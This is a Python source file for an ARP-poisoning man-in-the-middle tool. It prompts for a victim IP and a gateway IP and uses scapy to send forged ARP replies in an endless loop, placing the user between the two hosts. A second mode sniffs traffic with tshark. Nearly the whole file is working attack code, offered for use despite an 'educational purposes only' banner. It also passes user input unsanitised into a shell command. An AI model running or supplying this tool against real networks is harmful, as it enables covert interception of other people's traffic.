#!/usr/bin/env python3

# Make sure to run it in admin
# before using this script !

from scapy.all import *
from scapy.layers.l2 import *
import os
import time
from colorama import Fore
import gc
import getmac

red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW
white = Fore.WHITE

def clear():
    os.system("clear")

clear()

victim_ip = input("Enter the victim ip: ")
gateway_ip = input("Enter your gateway ip [e.g 192.168.1.254]: ")

mac_addr = getmac.get_mac_address() # get ur own MAC address

gateway_ping = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has", pdst=gateway_ip) 
ans, unans = srp(gateway_ping)
gateway_mac = ans[0][1][ARP].hwsrc # get gateway's mac address

victim_ping = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has", pdst=victim_ip) 
ans, unans = srp(victim_ping)
victim_mac = ans[0][1][ARP].hwsrc # get victim's mac address

def restore_arp(gateway_mac, gateway_ip, victim_mac, victim_ip):
    sendp(Ether(src=victim_mac, dst=gateway_mac)/ARP(op="who-has", psrc=victim_ip, pdst=gateway_ip)) # restore arp table of each
    sendp(Ether(src=gateway_mac, dst=victim_mac)/ARP(op="who-has", psrc=gateway_ip, pdst=victim_ip)) # device (gateway and victim)

def poison(gateway_mac, gateway_ip, victim_mac, victim_ip):
    pkt_gateway = Ether(src=mac_addr, dst=gateway_mac)/ARP(op=2, psrc=victim_ip, pdst=gateway_ip)
    pkt_victim = Ether(src=mac_addr, dst=victim_mac)/ARP(op=2, psrc=gateway_ip, pdst=victim_ip)  
    gc.collect()
    try:
        while True: 
            sendp(pkt_gateway, verbose=False) # don't stop saying you are
            sendp(pkt_victim, verbose=False) # both the gateway and the victim
            time.sleep(4)
    except (KeyboardInterrupt, SystemExit):
        restore_arp(gateway_mac, gateway_ip, victim_mac, victim_ip)
        print("Ctrl+c : Restoring ARP tables...")
        exit()

banner = red + r"""This tool is for eductational purposes only !
Do not use for illegal or unethical activity.
For any problems, please refer to the README.md
    __  _______________  ___
   /  |/  /  _/_  __/  |/  / """ + white + """▄︻デ═══━一""" + red + """* ARP
  / /|_/ // /  / / / /|_/ / 
 /_/  /_/___/ /_/ /_/  /_/   """ + yellow + """tool made by eur0pium

 My Github : https://github.com/zephir74
"""

clear()

print(banner)

mode = input(white + "Enter mode to use [sniffing/ARP MITM]: ")

if mode == "sniffing":
    iface = input("Enter interface to use: ")
    print()
    output = os.system("tshark -i " + iface)
    try:
        print(output)
    except KeyboardInterrupt:
        clear()
        print("Exiting...")
        exit()

elif mode == "ARP MITM":
    clear()
    print(banner)
    print(green + """ +--------------+
 | Target ip: """ + red + victim_ip + green + """
 | Gateway ip: """ + red + gateway_ip + green + """
 | Attack type: """ + red + mode + green + """
 +--------------+""")
    print(white + "Now you should be between the gateway and " + red + victim_ip)
    poison(gateway_mac, gateway_ip, victim_mac, victim_ip) # starts poisoning

else:
    print(f"Invalid input {mode}")
    print("Abort.")
    exit()
